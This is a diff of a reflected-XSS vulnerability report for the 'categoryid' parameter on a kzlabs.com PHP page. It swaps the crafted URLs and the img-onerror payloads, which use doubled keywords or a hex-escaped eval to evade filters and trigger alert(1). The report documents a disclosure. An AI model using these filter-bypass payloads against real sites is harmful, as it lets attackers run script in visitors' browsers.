@@ -1,6 +1,6 @@
 
 ## Title
-Reflected XSS in hidden **categoryid** parameter 
+Reflected XSS in **categoryid** parameter 
 
 ## Vulnerability Type
 Reflected XSS
@@ -9,13 +9,13 @@ Reflected XSS
 The kzlabs.com/punishment page has an Reflected XSS vulnerability in the **categoryid** parameter. whatever you type into the **categoryid** parameter gets embedded raw into a page response with no sanitization, By injecting an HTML tag with an event handler arbitary JavaScript executes immediately when they visit crafted URL
 ## Vulnerable Endpoint
 ```
-http://kzlabs.com/punishment/19.php?categoryid=
+http://kzlabs.com/punishment/20.php?categoryid=
 ```
 
 ## Steps to Reproduce
 1. Go to the following crafted URL
 ```
-http://kzlabs.com/punishment/20.php?categoryid=%22%3E%3Cimg%20src=x%20onerror=eVeValAl(1)%3E
+http://kzlabs.com/punishment/20.php?categoryid=%3CImg%20src=x%20onerror=%22eval(%27\x61\x6c\x65\x72\x74(1)%27)%22%3E
 ```
 3.Wait for the page to load
 
@@ -24,20 +24,22 @@ http://kzlabs.com/punishment/20.php?categoryid=%22%3E%3Cimg%20src=x%20onerror=eV
 
 ## Payload Used
 ```
-"><IMG src=x onerror=eVeValAL(1)>
+<Img src=x onerror="eval('\x61\x6c\x65\x72\x74(1)')">
 ```
 
 ## Proof of Concept
 
 **Screenshot 1** — URL bar showing payload injected directly into the **categoryid** parameter with the response refelcting raw in the page source without any sanitization 
 
-<img width="1275" height="944" alt="image" src="https://github.com/user-attachments/assets/0dd3ac99-e247-4c6f-bf94-8f63def8febb" />
+<img width="1437" height="835" alt="image" src="https://github.com/user-attachments/assets/114d5ffb-8baf-48c4-b8ff-3fd34d1c387f" />
 
 
 
-**Screenshot 2** — Alert box displaying 1 triggered after submitting the payload "><IMG src=x onerror=alalertert(1)> ,with the payload visible in the URL bar  confirming reflected XSS execution in the browser.
 
-<img width="1493" height="870" alt="image" src="https://github.com/user-attachments/assets/f5f87f7e-c67c-4745-910d-3ebb5abaface" />
+**Screenshot 2** — Alert box displaying 1 triggered after submitting the payload <Img src=x onerror="eval('\x61\x6c\x65\x72\x74(1)')"> ,with the payload visible in the URL bar  confirming reflected XSS execution in the browser.
+
+<img width="1637" height="938" alt="image" src="https://github.com/user-attachments/assets/0227ceee-a3c6-4f4c-8ac2-e248c2644dc5" />
+
 
 
 
